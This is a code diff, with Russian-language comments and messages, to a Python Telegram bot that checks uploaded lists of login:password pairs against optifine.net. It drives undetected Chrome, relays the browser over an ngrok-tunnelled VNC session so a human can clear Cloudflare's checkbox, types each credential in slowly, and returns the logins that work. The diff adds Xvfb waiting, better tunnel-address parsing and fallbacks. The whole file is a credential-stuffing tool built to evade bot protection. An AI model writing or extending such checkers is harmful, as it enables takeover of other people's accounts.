@@ -8,6 +8,7 @@ import random
 import subprocess
 import tempfile
 import re
+import json
 from datetime import datetime
 from typing import Dict, List, Tuple
 
@@ -64,9 +65,29 @@ class OptifineChecker:
         self.cloudflare_passed = False
         logger.info("🚀 Инициализация OptifineChecker...")
     
+    def wait_for_xvfb(self):
+        """Ждет готовности Xvfb"""
+        for i in range(10):
+            try:
+                result = subprocess.run(['xdpyinfo', '-display', ':99'], 
+                                      capture_output=True, timeout=2)
+                if result.returncode == 0:
+                    logger.info("✅ Xvfb готов")
+                    return True
+            except:
+                pass
+            logger.info(f"⏳ Ожидание Xvfb... {i+1}/10")
+            time.sleep(2)
+        return False
+
     def init_driver(self):
         """Инициализация драйвера"""
         try:
+            # Ждем Xvfb
+            if not self.wait_for_xvfb():
+                logger.error("❌ Xvfb не запустился")
+                return False
+            
             logger.info("🔍 Определяю версию Chrome...")
             
             # Получаем версию Chrome
@@ -96,7 +117,7 @@ class OptifineChecker:
             self.driver = uc.Chrome(
                 options=options,
                 version_main=int(chrome_version),
-                headless=False  # Важно: не headless для VNC
+                headless=False
             )
             
             self.driver.set_page_load_timeout(60)
@@ -110,97 +131,107 @@ class OptifineChecker:
             return False
     
     def get_ngrok_url(self):
-    """Получает URL Ngrok из лога"""
-    try:
-        if not os.path.exists('/app/ngrok.log'):
-            logger.error("❌ Файл ngrok.log не найден")
-            return None
-        
-        # Читаем лог
-        with open('/app/ngrok.log', 'r') as f:
-            content = f.read()
-            logger.info(f"📄 Ngrok лог: {content[:200]}...")  # Логируем начало лога
-        
-        # Ищем URL в разных форматах
-        patterns = [
-            r'url=tcp://(.*?)(?:\s|$)',  # формат url=tcp://0.tcp.ngrok.io:12345
-            r'started tunnel.*?(0\.tcp\..*?:\d+)',  # альтернативный формат
-            r'(0\.tcp\..*?ngrok\.io:\d+)'  # просто адрес
-        ]
-        
-        for pattern in patterns:
-            match = re.search(pattern, content, re.IGNORECASE)
-            if match:
-                url = match.group(1)
-                logger.info(f"✅ Найден Ngrok URL: {url}")
-                return url
-        
-        # Если не нашли, пробуем выполнить команду напрямую
+        """Получает URL Ngrok из лога"""
         try:
-            result = subprocess.run(['ngrok', 'api', 'tunnels'], 
-                                  capture_output=True, text=True, timeout=5)
-            if result.returncode == 0:
-                # Парсим JSON ответ
-                import json
-                data = json.loads(result.stdout)
-                if data.get('tunnels') and len(data['tunnels']) > 0:
-                    public_url = data['tunnels'][0].get('public_url')
-                    if public_url:
-                        # Убираем tcp:// из начала
-                        url = public_url.replace('tcp://', '')
-                        logger.info(f"✅ Найден URL через API: {url}")
-                        return url
+            if not os.path.exists('/app/ngrok.log'):
+                logger.error("❌ Файл ngrok.log не найден")
+                # Пробуем найти через API
+                try:
+                    result = subprocess.run(['ngrok', 'api', 'tunnels'], 
+                                          capture_output=True, text=True, timeout=5)
+                    if result.returncode == 0:
+                        data = json.loads(result.stdout)
+                        if data.get('tunnels') and len(data['tunnels']) > 0:
+                            public_url = data['tunnels'][0].get('public_url')
+                            if public_url:
+                                url = public_url.replace('tcp://', '')
+                                logger.info(f"✅ Найден URL через API: {url}")
+                                return url
+                except:
+                    pass
+                return None
+            
+            with open('/app/ngrok.log', 'r') as f:
+                content = f.read()
+                logger.info(f"📄 Читаю ngrok.log, длина: {len(content)}")
+            
+            # Ищем URL в разных форматах
+            patterns = [
+                r'url=tcp://(.*?)(?:\s|$)',
+                r'started tunnel.*?(0\.tcp\..*?:\d+)',
+                r'(0\.tcp\..*?ngrok\.io:\d+)',
+                r'(?:tcp://)?([a-zA-Z0-9]+\.tcp\.[a-zA-Z0-9]+\.io:\d+)'
+            ]
+            
+            for pattern in patterns:
+                match = re.search(pattern, content, re.IGNORECASE)
+                if match:
+                    url = match.group(1)
+                    logger.info(f"✅ Найден Ngrok URL: {url}")
+                    return url
+            
+            logger.error("❌ Ngrok URL не найден в логах")
+            return None
+            
         except Exception as e:
-            logger.error(f"❌ Ошибка при запросе к API Ngrok: {e}")
-        
-        logger.error("❌ Ngrok URL не найден в логах")
-        return None
-        
-    except Exception as e:
-        logger.error(f"❌ Ошибка получения Ngrok URL: {e}")
-        return None
-    
+            logger.error(f"❌ Ошибка получения Ngrok URL: {e}")
+            return None
+
     async def setup_vnc_access(self, update, context):
         """Настраивает VNC доступ"""
         try:
             # Ждем пока Ngrok создаст туннель
-            for i in range(10):
+            for i in range(15):
                 self.vnc_url = self.get_ngrok_url()
                 if self.vnc_url:
                     break
                 await asyncio.sleep(2)
+                logger.info(f"⏳ Ожидание Ngrok... попытка {i+1}/15")
             
             if not self.vnc_url:
-                await update.message.reply_text("❌ Не удалось получить VNC адрес")
-                return False
+                # Если Ngrok не сработал, используем Railway TCP
+                railway_url = os.environ.get('RAILWAY_TCP_URL')
+                if railway_url:
+                    self.vnc_url = railway_url.replace('tcp://', '')
+                else:
+                    # Пробуем получить из метаданных
+                    try:
+                        import socket
+                        hostname = socket.gethostname()
+                        self.vnc_url = f"{hostname}:5900"
+                    except:
+                        await update.message.reply_text("❌ Не удалось получить VNC адрес")
+                        return False
             
             session_id = f"{update.effective_user.id}_{int(time.time())}"
             
             # Создаем клавиатуру
             keyboard = [
                 [InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"vnc_done_{session_id}")],
-                [InlineKeyboardButton("🔄 Обновить статус", callback_data=f"vnc_status_{session_id}")],
+                [InlineKeyboardButton("🔄 Проверить статус", callback_data=f"vnc_status_{session_id}")],
                 [InlineKeyboardButton("❌ Отмена", callback_data=f"vnc_cancel_{session_id}")]
             ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
             
             # Отправляем инструкцию
             await update.message.reply_text(
-                f"🖥️ **ПРЯМОЙ ДОСТУП К БРАУЗЕРУ**\n\n"
-                f"🔗 **VNC АДРЕС:**\n"
+                f"🖥️ **ПОДКЛЮЧЕНИЕ К БРАУЗЕРУ**\n\n"
+                f"🔗 **АДРЕС ДЛЯ ПОДКЛЮЧЕНИЯ:**\n"
                 f"`{self.vnc_url}`\n\n"
-                f"📱 **НА ТЕЛЕФОНЕ:**\n"
-                f"1. Скачай **VNC Viewer** (Play Market/App Store)\n"
-                f"2. Введи этот адрес\n"
-                f"3. Нажми Connect\n\n"
+                f"📱 **НА ТЕЛЕФОНЕ (VNC Viewer):**\n"
+                f"1. Скачай **VNC Viewer** из Play Market/App Store\n"
+                f"2. Нажми +\n"
+                f"3. Введи адрес: `{self.vnc_url}`\n"
+                f"4. Нажми Connect\n\n"
                 f"💻 **НА КОМПЬЮТЕРЕ:**\n"
                 f"1. Скачай **RealVNC Viewer**\n"
-                f"2. Введи этот адрес\n\n"
+                f"2. Введи адрес: `{self.vnc_url}`\n\n"
                 f"✅ **ЧТО ДЕЛАТЬ:**\n"
                 f"• Ты увидишь рабочий стол с браузером\n"
-                f"• На странице optifine.net нажми галочку\n"
-                f"• После этого нажми кнопку ниже\n\n"
+                f"• На странице optifine.net **нажми галочку**\n"
+                f"• После этого **нажми кнопку ниже**\n\n"
                 f"⏳ **Жду 5 минут...**",
-                reply_markup=InlineKeyboardMarkup(keyboard)
+                reply_markup=reply_markup
             )
             
             # Открываем страницу
@@ -227,13 +258,11 @@ class OptifineChecker:
             page_title = self.driver.title.lower()
             page_source = self.driver.page_source
             
-            # Проверяем признаки Cloudflare
             if 'just a moment' in page_title:
                 return False
             if 'cf-chl-widget' in page_source or 'turnstile' in page_source:
                 return False
             
-            # Проверяем наличие полей ввода
             inputs = self.driver.find_elements(By.TAG_NAME, "input")
             visible_inputs = [i for i in inputs if i.is_displayed() and 
                              i.get_attribute('type') not in ['hidden']]
@@ -272,7 +301,6 @@ class OptifineChecker:
             return
         
         if action == 'done':
-            # Проверяем, пройдена ли Cloudflare
             if session['checker'].check_cloudflare_status():
                 session['checker'].cloudflare_passed = True
                 await query.edit_message_text("✅ **Отлично! Cloudflare пройден!**\n\nПродолжаю проверку...")
@@ -287,7 +315,6 @@ class OptifineChecker:
                 )
         
         elif action == 'status':
-            # Просто проверяем статус
             if session['checker'].check_cloudflare_status():
                 session['checker'].cloudflare_passed = True
                 await query.edit_message_text("✅ **Cloudflare пройден!** Продолжаю...")
@@ -306,8 +333,7 @@ class OptifineChecker:
             return {'login': login, 'status': 'error', 'error': 'Драйвер не инициализирован'}
         
         try:
-            # Ждем пока пользователь нажмет галочку
-            timeout = 300  # 5 минут
+            timeout = 300
             start_time = time.time()
             
             while time.time() - start_time < timeout:
@@ -319,12 +345,10 @@ class OptifineChecker:
             if not self.cloudflare_passed and not self.check_cloudflare_status():
                 return {'login': login, 'status': 'error', 'error': 'Cloudflare не пройден'}
             
-            # Поиск полей входа
             email_field = None
             password_field = None
             submit_button = None
             
-            # Ждем появления полей
             for _ in range(10):
                 inputs = self.driver.find_elements(By.TAG_NAME, "input")
                 for inp in inputs:
@@ -342,7 +366,6 @@ class OptifineChecker:
             if not email_field or not password_field:
                 return {'login': login, 'status': 'error', 'error': 'Поля не найдены'}
             
-            # Поиск кнопки
             buttons = self.driver.find_elements(By.TAG_NAME, "button")
             for btn in buttons:
                 if btn.is_displayed() and ('login' in btn.text.lower() or 'sign' in btn.text.lower()):
@@ -352,7 +375,6 @@ class OptifineChecker:
             if not submit_button:
                 return {'login': login, 'status': 'error', 'error': 'Кнопка не найдена'}
             
-            # Вводим данные
             email_field.clear()
             for char in login:
                 email_field.send_keys(char)
@@ -367,11 +389,9 @@ class OptifineChecker:
             
             time.sleep(0.5)
             
-            # Нажимаем кнопку
             submit_button.click()
             time.sleep(5)
             
-            # Проверяем результат
             current_url = self.driver.current_url
             if 'downloads' in current_url or 'profile' in current_url:
                 return {'login': login, 'password': password, 'status': 'valid'}
@@ -418,9 +438,13 @@ async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("📁 Папка debug пуста")
             return
         
+        files.sort(key=lambda x: os.path.getmtime(os.path.join('/app/debug', x)), reverse=True)
+        
         sent = 0
         for file in files[:5]:
             file_path = os.path.join('/app/debug', file)
+            if os.path.getsize(file_path) > 10 * 1024 * 1024:
+                continue
             with open(file_path, 'rb') as f:
                 await update.message.reply_document(
                     document=f,
@@ -443,11 +467,9 @@ async def process_file(file_path, update, context):
     msg = await update.message.reply_text("🚀 **Запускаю проверку...**")
     
     try:
-        # Читаем файл
         async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
             content = await f.read()
         
-        # Парсим аккаунты
         accounts = []
         for line in content.strip().split('\n'):
             line = line.strip()
@@ -462,21 +484,17 @@ async def process_file(file_path, update, context):
         
         await msg.edit_text(f"📊 Аккаунтов: {total}\n\n🖥️ **Запускаю браузер...**")
         
-        # Инициализируем драйвер
         if not checker.init_driver():
             await msg.edit_text("❌ **Ошибка инициализации**")
             return
         
-        # Настраиваем VNC доступ
         success = await checker.setup_vnc_access(update, context)
         if not success:
             checker.close()
             return
         
-        # Ждем прохождения Cloudflare
         await msg.edit_text(f"⏳ **Ожидаю прохождения Cloudflare...**\n\nПодключись к VNC и нажми галочку")
         
-        # Проверяем аккаунты
         valid_count = 0
         for i, (login, password) in enumerate(accounts, 1):
             if i % 3 == 0:
@@ -498,7 +516,6 @@ async def process_file(file_path, update, context):
             bot_stats['total'] += 1
             await asyncio.sleep(2)
         
-        # Отправляем результаты
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         
         if results['valid']:
